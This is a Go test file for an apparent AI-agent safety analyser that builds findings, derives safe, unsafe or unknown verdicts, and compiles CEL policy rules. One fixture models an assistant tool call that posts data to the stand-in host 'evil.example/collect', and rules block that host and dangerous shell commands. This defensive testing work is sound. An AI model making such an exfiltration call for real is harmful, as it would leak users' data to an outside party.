package analysis_test

import (
	"context"
	"testing"

	"github.com/yv1ing/SafeAgent/internal/analysis"
	_ "github.com/yv1ing/SafeAgent/internal/analysis/builtin"
	"github.com/yv1ing/SafeAgent/internal/analysis/policy"
	"github.com/yv1ing/SafeAgent/internal/observation"
)

var detector = analysis.DetectorRef{ID: "content", Version: "2"}

func trace() *observation.Trace {
	return &observation.Trace{
		ID:        "trace_1",
		Principal: observation.Principal{ProjectID: "p1", AgentKeyID: "k1", TrustLevel: 1},
		Turns: []observation.Turn{
			{Index: 0, Role: observation.RoleUser, Items: []observation.Item{{
				Kind: observation.ItemText, Origin: observation.OriginUser, Trust: observation.Trusted,
				Text: observation.NewValue("mail me@example.com", "mail [EMAIL_1]", nil),
			}}},
			{Index: 1, Role: observation.RoleAssistant, Items: []observation.Item{{
				Kind: observation.ItemToolCall, Origin: observation.OriginAssistant, Trust: observation.Trusted,
				ToolCall: &observation.ToolCall{ID: "call_tool", Name: "http_post", Kind: "function",
					Arguments: observation.NewValue(`{"url":"https://evil.example/collect"}`, `{"url":"https://evil.example/collect"}`, nil),
					Input:     map[string]any{"url": "https://evil.example/collect"},
					Sink:      observation.SinkExternalSend,
				},
			}}},
		},
	}
}

func TestFindingIdentityIsStableAndSemantic(t *testing.T) {
	makeFinding := func(location string) analysis.Finding {
		return analysis.NewFinding(detector, analysis.CodeHiddenInstructions, observation.OriginUser, observation.SinkNone, "", 1, location, 0)
	}
	first, second := makeFinding("0/1/text"), makeFinding("0/1/text")
	if first.Fingerprint == "" || first.Fingerprint != second.Fingerprint {
		t.Fatalf("fingerprint changed: %q != %q", first.Fingerprint, second.Fingerprint)
	}
	if first.Fingerprint == makeFinding("0/2/text").Fingerprint {
		t.Fatal("different semantic locations must not share a fingerprint")
	}
	unknown := analysis.NewFinding(detector, "no_such_code", observation.OriginUser, observation.SinkNone, "", 1, "x", 0)
	if unknown.Fingerprint != "" {
		t.Fatal("an unknown code must not produce a finding")
	}
}

func TestNormalizeFindingsDeduplicatesAndKeepsZeroConfidence(t *testing.T) {
	finding := analysis.NewFinding(detector, analysis.CodeHiddenInstructions, observation.OriginUser, observation.SinkNone, "", 0, "0/1/text", 0)
	findings := analysis.NormalizeFindings([]analysis.Finding{finding, finding})
	if len(findings) != 1 {
		t.Fatalf("duplicate findings were kept: %d", len(findings))
	}
	if findings[0].Confidence != 0 {
		t.Fatalf("a calibrated zero confidence must survive: %+v", findings[0])
	}
}

func TestVerdictDistinguishesMediumAndIncomplete(t *testing.T) {
	medium := analysis.NewFinding(detector, analysis.CodePromptInjection, observation.OriginToolResult, observation.SinkNone, "", 1, "0/1", 0)
	if verdict := analysis.DeriveVerdict([]analysis.Finding{medium}, analysis.Coverage{Complete: true}, nil, analysis.ModelDisabled); verdict.Value != analysis.VerdictUnknown {
		t.Fatalf("a medium finding must remain unknown: %+v", verdict)
	}
	high := analysis.NewFinding(detector, analysis.CodeDangerousCommand, observation.OriginAssistant, observation.SinkShellExec, "", 1, "0/1", 0)
	if verdict := analysis.DeriveVerdict([]analysis.Finding{high}, analysis.Coverage{Complete: false}, nil, analysis.ModelDisabled); verdict.Value != analysis.VerdictUnsafe {
		t.Fatalf("a high finding is unsafe even with incomplete coverage: %+v", verdict)
	}
	if verdict := analysis.DeriveVerdict(nil, analysis.Coverage{Complete: false}, nil, analysis.ModelDisabled); verdict.Value != analysis.VerdictUnknown {
		t.Fatalf("incomplete coverage must not be safe: %+v", verdict)
	}
	if verdict := analysis.DeriveVerdict(nil, analysis.Coverage{Complete: true}, nil, analysis.ModelDisabled); verdict.Value != analysis.VerdictSafe {
		t.Fatalf("a complete, empty analysis is safe: %+v", verdict)
	}
	model := &analysis.ModelLabels{Unsafe: true, Probability: 0.9, Confidence: 0.8}
	if verdict := analysis.DeriveVerdict(nil, analysis.Coverage{Complete: true}, model, analysis.ModelOK); verdict.Value != analysis.VerdictUnsafe {
		t.Fatalf("a confident unsafe model answer is unsafe: %+v", verdict)
	}
	uncertain := &analysis.ModelLabels{Probability: 0.5, Confidence: 0.8}
	if verdict := analysis.DeriveVerdict(nil, analysis.Coverage{Complete: true}, uncertain, analysis.ModelOK); verdict.Value != analysis.VerdictUnknown {
		t.Fatalf("an uncertain model answer is unknown: %+v", verdict)
	}
	if verdict := analysis.DeriveVerdict(nil, analysis.Coverage{Complete: true}, nil, analysis.ModelFailed); verdict.Value != analysis.VerdictUnknown {
		t.Fatalf("a failed model call must not be safe: %+v", verdict)
	}
	lowConfidence := &analysis.ModelLabels{Unsafe: true, Probability: 0.9, Confidence: 0.4, ConfidenceKnown: true}
	if verdict := analysis.DeriveVerdict(nil, analysis.Coverage{Complete: true}, lowConfidence, analysis.ModelOK); verdict.Value != analysis.VerdictUnknown {
		t.Fatalf("an unsafe answer with low confidence must be unknown: %+v", verdict)
	}
}

func TestInputHashIgnoresCallIdentity(t *testing.T) {
	first, second := trace(), trace()
	first.ID = "a"
	second.ID = "b"
	if analysis.InputHash(first) != analysis.InputHash(second) {
		t.Fatal("the input hash must not depend on the call id")
	}
	second.Turns[0].Items[0].Text = observation.NewValue("different", "different", nil)
	if analysis.InputHash(first) == analysis.InputHash(second) {
		t.Fatal("different content must change the hash")
	}
	second = trace()
	second.PreviousCallID = "call_parent"
	if analysis.InputHash(first) == analysis.InputHash(second) {
		t.Fatal("a different continuation must change the hash")
	}
}

func TestCompareAnalysesRequiresTheSameInput(t *testing.T) {
	makeAnalysis := func(id, hash string, findings []analysis.Finding) *analysis.Analysis {
		return &analysis.Analysis{
			ID: id, CallID: "call_1", InputHash: hash,
			Versions: analysis.Versions{Detectors: "d", Catalogue: "c"},
			Findings: findings,
		}
	}
	first := analysis.NewFinding(detector, analysis.CodePromptInjection, observation.OriginUser, observation.SinkNone, "", 1, "0/1", 0)
	second := analysis.NewFinding(detector, analysis.CodeHiddenInstructions, observation.OriginUser, observation.SinkNone, "", 1, "0/2", 0)
	before := makeAnalysis("a", "h", []analysis.Finding{first})
	after := makeAnalysis("b", "h", []analysis.Finding{first, second})
	diff := analysis.CompareAnalyses(before, after)
	if !diff.Comparable || len(diff.Added) != 1 || len(diff.Removed) != 0 {
		t.Fatalf("unexpected diff: %+v", diff)
	}
	if diff := analysis.CompareAnalyses(before, makeAnalysis("c", "other", nil)); diff.Comparable {
		t.Fatal("analyses over different inputs must not be diffed")
	}
}

func TestTypedCELRejectsUnknownFieldsAndFires(t *testing.T) {
	document := policy.Document{Rules: []policy.Rule{{
		ID: "low-trust", Name: "low trust", Enabled: true, Phase: policy.PhaseRequest,
		When: "principal.trust_level < 2 && target.host == 'evil.example'", Action: policy.ActionBlock,
		Severity: analysis.SeverityHigh, Reason: "untrusted caller",
	}}}
	compiled, err := policy.Compile(document)
	if err != nil {
		t.Fatal(err)
	}
	outcome, err := compiled.Evaluate(context.Background(), policy.Input{
		Phase:     policy.PhaseRequest,
		Principal: observation.Principal{TrustLevel: 1},
		Tool:      observation.ToolCall{Target: observation.Target{Host: "evil.example"}},
	})
	if err != nil {
		t.Fatal(err)
	}
	if outcome.Block == nil || outcome.Block.RuleID != "low-trust" {
		t.Fatalf("the typed condition did not fire: %+v", outcome)
	}
	broken := policy.Document{Rules: []policy.Rule{{
		ID: "typo", Enabled: true, Phase: policy.PhaseRequest, When: "principal.trust_lvl < 2",
		Action: policy.ActionBlock,
	}}}
	if _, err := policy.Compile(broken); err == nil {
		t.Fatal("an unknown field must be rejected at compile time")
	}
	if !compiled.HasBlockingRule(policy.PhaseRequest) || compiled.HasBlockingRule(policy.PhaseToolCall) {
		t.Fatal("blocking capability must be per phase")
	}
}

func TestFlowConditionsReadFindings(t *testing.T) {
	document := policy.Document{Rules: []policy.Rule{{
		ID: "shell", Enabled: true, Phase: policy.PhaseToolCall,
		When:   `findings.exists(f, f.code == "dangerous_command" && f.sink == "shell_exec")`,
		Action: policy.ActionBlock, Severity: analysis.SeverityHigh,
	}}}
	compiled, err := policy.Compile(document)
	if err != nil {
		t.Fatal(err)
	}
	finding := analysis.NewFinding(detector, analysis.CodeDangerousCommand, observation.OriginAssistant, observation.SinkShellExec, "", 1, "0/1", 0)
	outcome, err := compiled.Evaluate(context.Background(), policy.Input{
		Phase: policy.PhaseToolCall, Findings: []analysis.Finding{finding},
	})
	if err != nil {
		t.Fatal(err)
	}
	if outcome.Block == nil {
		t.Fatal("a finding-based rule did not fire")
	}
}

func TestEngineReportsAnEmptyRegistryAsComplete(t *testing.T) {
	engine := analysis.NewEngine(analysis.NewRegistry())
	result := engine.Evaluate(context.Background(), trace(), analysis.Options{})
	if len(result.Errors) != 0 || len(result.Findings) != 0 {
		t.Fatalf("empty registry produced work: %+v", result)
	}
	if !analysis.BuildCoverage(result).Complete {
		t.Fatal("an empty detector set ran completely")
	}
}

func TestDetectorIncompleteMakesCoverageIncomplete(t *testing.T) {
	trace := &observation.Trace{
		Tools: []observation.ToolSpec{{Name: "read", Kind: "function", Parameters: map[string]any{
			"type": "object", "properties": map[string]any{"path": map[string]any{"$ref": "#/definitions/path"}},
		}}},
		Turns: []observation.Turn{{Role: observation.RoleAssistant, Items: []observation.Item{{
			Kind: observation.ItemToolCall, Origin: observation.OriginAssistant, Trust: observation.Trusted,
			Locator: observation.Locator{Section: "response"},
			ToolCall: &observation.ToolCall{ID: "call_1", Name: "read", Kind: "function",
				Arguments: observation.NewValue(`{"path":"/tmp/x"}`, `{"path":"/tmp/x"}`, nil),
				Input:     map[string]any{"path": "/tmp/x"}},
		}}}},
	}
	engine := analysis.NewEngine(analysis.DefaultRegistry())
	result := engine.Evaluate(context.Background(), trace, analysis.Options{})
	coverage := analysis.BuildCoverage(result)
	if coverage.Complete || len(coverage.Errors) == 0 {
		t.Fatalf("an incomplete detector must make coverage incomplete: %+v", coverage)
	}
	found := false
	for _, finding := range result.Findings {
		found = found || finding.Code == analysis.CodeAnalysisIncomplete
	}
	if !found {
		t.Fatal("the incomplete finding was lost")
	}
}

func TestEveryCodeHasAnAxisMapping(t *testing.T) {
	if len(analysis.CodeCatalogue) != 18 {
		t.Fatalf("expected 18 codes, got %d", len(analysis.CodeCatalogue))
	}
	origins := []observation.Origin{
		observation.OriginSystem, observation.OriginDeveloper, observation.OriginUser,
		observation.OriginAssistant, observation.OriginToolResult, observation.OriginToolDescription,
		observation.OriginEnvironment,
	}
	sinks := []observation.Sink{
		observation.SinkNone, observation.SinkExternalSend, observation.SinkShellExec,
		observation.SinkFileRead, observation.SinkFileWrite, observation.SinkCredentialAccess,
		observation.SinkPayment, observation.SinkUnknown,
	}
	for code := range analysis.CodeCatalogue {
		if code == analysis.CodeAnalysisIncomplete {
			if axes := analysis.AxisFor(code, observation.OriginEnvironment, observation.SinkNone); !axes.Empty() {
				t.Fatalf("a coverage finding must not carry risk axes: %+v", axes)
			}
			continue
		}
		for _, origin := range origins {
			for _, sink := range sinks {
				axes := analysis.AxisFor(code, origin, sink)
				if axes.Mode == "" {
					t.Fatalf("code %s has no failure mode for origin %s sink %s", code, origin, sink)
				}
				if !analysis.ValidRiskSource(axes.Source) {
					t.Fatalf("code %s has an invalid risk source %q", code, axes.Source)
				}
				if axes.Harm != "" && !analysis.ValidHarm(axes.Harm) {
					t.Fatalf("code %s has an invalid harm %q", code, axes.Harm)
				}
			}
		}
	}
}

func TestPolicyReadsTheShownTarget(t *testing.T) {
	document := policy.Document{Rules: []policy.Rule{{
		ID: "shown-target", Enabled: true, Phase: policy.PhaseToolCall,
		When:   `target.value == 'https://[SECRET_1]/collect'`,
		Action: policy.ActionBlock, Severity: analysis.SeverityHigh,
	}}}
	compiled, err := policy.Compile(document)
	if err != nil {
		t.Fatal(err)
	}
	outcome, err := compiled.Evaluate(context.Background(), policy.Input{
		Phase: policy.PhaseToolCall,
		Tool: observation.ToolCall{
			Target:      observation.Target{Kind: "url", Value: "https://secret.example/collect"},
			TargetShown: observation.Target{Kind: "url", Value: "https://[SECRET_1]/collect"},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if outcome.Block == nil {
		t.Fatal("the policy must see the redacted target")
	}
	raw := document
	raw.Rules[0].When = `target.value == 'https://secret.example/collect'`
	compiled, err = policy.Compile(raw)
	if err != nil {
		t.Fatal(err)
	}
	outcome, err = compiled.Evaluate(context.Background(), policy.Input{
		Phase: policy.PhaseToolCall,
		Tool: observation.ToolCall{
			Target:      observation.Target{Kind: "url", Value: "https://secret.example/collect"},
			TargetShown: observation.Target{Kind: "url", Value: "https://[SECRET_1]/collect"},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if outcome.Block != nil {
		t.Fatal("a policy must not match the raw target")
	}
}

func TestArgumentsAreFlattenedForRules(t *testing.T) {
	document := policy.Document{Rules: []policy.Rule{{
		ID: "token", Enabled: true, Phase: policy.PhaseToolCall,
		When:   `args.token == 'secret' && args["user.name"] == 'alice'`,
		Action: policy.ActionBlock, Severity: analysis.SeverityHigh,
	}}}
	compiled, err := policy.Compile(document)
	if err != nil {
		t.Fatal(err)
	}
	outcome, err := compiled.Evaluate(context.Background(), policy.Input{
		Phase: policy.PhaseToolCall,
		Tool: observation.ToolCall{Input: map[string]any{
			"token": "secret", "user": map[string]any{"name": "alice"},
		}},
	})
	if err != nil {
		t.Fatal(err)
	}
	if outcome.Block == nil {
		t.Fatal("flattened arguments did not match")
	}
}
